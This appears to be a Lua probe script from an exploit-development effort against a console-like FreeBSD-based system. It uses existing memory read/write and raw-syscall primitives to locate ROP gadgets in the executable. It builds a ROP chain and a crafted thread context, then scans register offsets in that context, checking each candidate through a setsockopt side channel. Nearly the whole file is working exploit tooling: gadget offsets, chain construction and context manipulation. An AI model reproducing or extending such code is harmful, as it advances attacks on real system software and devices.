-- CRASH_CLASS: LOW
-- PROBE 91p: Safe R10 offset test via IPV6_UNICAST_HOPS
--
-- Uses memory.alloc for ctx/tb (like working 91g), mmap for stack.
-- setsockopt(fd,41,4,optval,4): kernel READS from [R10], no write.
-- For each R10 candidate offset, check if UNICAST_HOPS changes.
-- Also varies R8 offset if standard R8=0x068 doesn't work.

print("=== PROBE 91p: R10 OFFSET (UNICAST_HOPS) ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l; if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local tk=mk(433); local mm=mk(477)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))

-- Known offsets
local _DI=0x048; local _SI=0x050; local _DX=0x058; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

-- Create IPv6 socket
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("IPv6 BLOCKED") return end

local function get_hops(fd)
    local gb=memory.alloc(8); z(gb,8)
    local gl=memory.alloc(4); wd(gl,4)
    native.fcall_with_rax(stub,118,fd,41,4,N(gb),N(gl))
    return rd(gb)
end

local function set_hops(fd, val)
    local vb=memory.alloc(4); wd(vb,val)
    native.fcall_with_rax(stub,105,fd,41,4,N(vb),4)
end

-- Verify baseline
set_hops(s6,42)
local h0=get_hops(s6)
print("baseline hops="..tostring(h0).." (expect 42)")

-- Short sleep buf (50ms)
local sl=memory.alloc(16); wq(sl,uint64(0)); wq(sl+8,uint64(50000000))
-- Nanosleep timespec (999s)
local ts=memory.alloc(16); wq(ts,uint64(999)); wq(ts+8,uint64(0))

-- ============================================================
-- Test function: one child, setsockopt(s6, 41, 4, optval, 4)
-- ctx and tb via memory.alloc (like 91g), stack via mmap
-- ============================================================
local function test_offset(r10_off, r8_off, label)
    -- Reset hops to 42
    set_hops(s6,42)

    -- optval = 77 (we'll check if hops changes to 77)
    local optval=memory.alloc(4); wd(optval,77)

    -- mmap a stack page
    local ok_s,stk=pcall(function()
        return mm(uint64(0),uint64(0x4000),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_s then print("  "..label..": MMAP FAIL") return false end

    -- Shared result
    local shared=memory.alloc(8); wq(shared,uint64(0xBADBAD))

    -- Build ROP chain: write rv to shared, then nanosleep
    local off=0
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(N(shared))); off=off+8
    wq(stk+off,WMOV); off=off+8
    wq(stk+off,PRDI); off=off+8
    wq(stk+off,uint64(N(ts))); off=off+8
    wq(stk+off,PRAX); off=off+8
    wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    -- Build context (memory.alloc like 91g)
    local ctx=memory.alloc(0x200); z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA)
    wq(ctx+_SP,uint64(N(stk)))
    wq(ctx+_AX,uint64(105))    -- setsockopt
    wq(ctx+_DI,uint64(s6))     -- fd
    wq(ctx+_SI,uint64(41))     -- IPPROTO_IPV6
    wq(ctx+_DX,uint64(4))      -- IPV6_UNICAST_HOPS

    -- Set R10 candidate = optval pointer
    wq(ctx+r10_off,uint64(N(optval)))
    -- Set R8 candidate = 4 (optlen)
    if r8_off ~= r10_off then
        wq(ctx+r8_off,uint64(4))
    end

    -- Create child
    local tb=memory.alloc(8); wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    local tid=rq(tb)

    -- Wait 50ms
    native.fcall_with_rax(stub,240,N(sl),0)

    -- Read child's return value
    local rv=rq(shared)
    local rv_n=-999
    if rv then
        if type(rv)=="table" then
            local h=rv.h or 0; if h<0 then h=h+0x100000000 end
            if h==0xFFFFFFFF then rv_n=-1 else rv_n=N(rv) end
        else rv_n=N(rv) end
    end

    -- Check hops from main
    local hops=get_hops(s6)

    local status=""
    if hops==77 then
        status=" *** HOPS=77 → R10+R8 CONFIRMED ***"
    elseif rv_n==0 and hops~=42 then
        status=" rv=0,hops="..tostring(hops)
    end

    print(string.format("  %s: rv=%d hops=%s%s", label, rv_n, tostring(hops), status))

    -- Kill child
    if tid and N(tid)>0 then pcall(function() tk(tid,uint64(9)) end) end

    return hops==77
end

-- ============================================================
-- Phase 1: Standard layout (R10=0x090, R8=0x068)
-- ============================================================
print("")
print("--- P1: std R10=0x090 R8=0x068 ---")
local found=test_offset(0x090, 0x068, "std")

-- ============================================================
-- Phase 2: Scan R10 offsets with R8=0x068
-- ============================================================
if not found then
    print("")
    print("--- P2: scan R10 (R8=0x068) ---")
    local r10c={0x060,0x068,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r10 in ipairs(r10c) do
        found=test_offset(r10, 0x068, string.format("R10=%03X",r10))
        if found then break end
    end
end

-- ============================================================
-- Phase 3: Scan R8 with R10=0x090
-- ============================================================
if not found then
    print("")
    print("--- P3: scan R8 (R10=0x090) ---")
    local r8c={0x060,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r8 in ipairs(r8c) do
        found=test_offset(0x090, r8, string.format("R8=%03X",r8))
        if found then break end
    end
end

-- ============================================================
-- Phase 4: Cross-matrix (all R10 × R8 where both ≠ known regs)
-- ============================================================
if not found then
    print("")
    print("--- P4: matrix ---")
    local all={0x060,0x070,0x080,0x088,0x098,0x0A0,0x0A8,0x0B0,0x0B8}
    for _,r10 in ipairs(all) do
        for _,r8 in ipairs(all) do
            if r10~=r8 then
                found=test_offset(r10, r8, string.format("%03X/%03X",r10,r8))
                if found then break end
            end
        end
        if found then break end
    end
end

if not found then
    print("")
    print("*** R10/R8 NOT FOUND IN ANY OFFSET ***")
    print("set_mcontext may not restore R10/R8")
end

print("")
native.fcall_with_rax(stub,6,s6)
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91p DONE ===")
